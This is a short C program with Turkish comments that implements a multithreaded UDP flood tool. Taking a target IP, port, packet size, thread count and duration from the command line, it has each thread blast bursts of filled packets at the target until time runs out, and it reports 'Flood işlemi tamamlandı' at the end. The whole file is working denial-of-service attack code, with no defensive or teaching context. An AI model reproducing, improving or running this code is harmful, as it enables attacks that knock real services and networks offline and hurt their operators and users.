#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

char *target_ip;
int target_port, packet_size, thread_count, duration;

void *flood(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    // socket send buffer büyütülsün (opsiyonel ama faydalı)
    int buffsize = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffsize, sizeof(buffsize));

    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip);

    char *data = malloc(packet_size);
    memset(data, 'A', packet_size);

    // tekrar hesaplamasın diye süreyi bir defa al
    time_t end = time(NULL) + duration;

    // optimize edilmiş tight loop (çok hızlı çalışır)
    while (time(NULL) < end) {
        for (int i = 0; i < 1000; i++) {  // 1000 adet burst
            sendto(sock, data, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
        }
    }

    free(data);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Kullanım: %s <ip> <port> <packet_size> <thread> <time>\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    packet_size = atoi(argv[3]);
    thread_count = atoi(argv[4]);
    duration = atoi(argv[5]);

    pthread_t *threads = malloc(sizeof(pthread_t) * thread_count);

    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, flood, NULL);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    printf("Flood işlemi tamamlandı.\n");
    return 0;
}
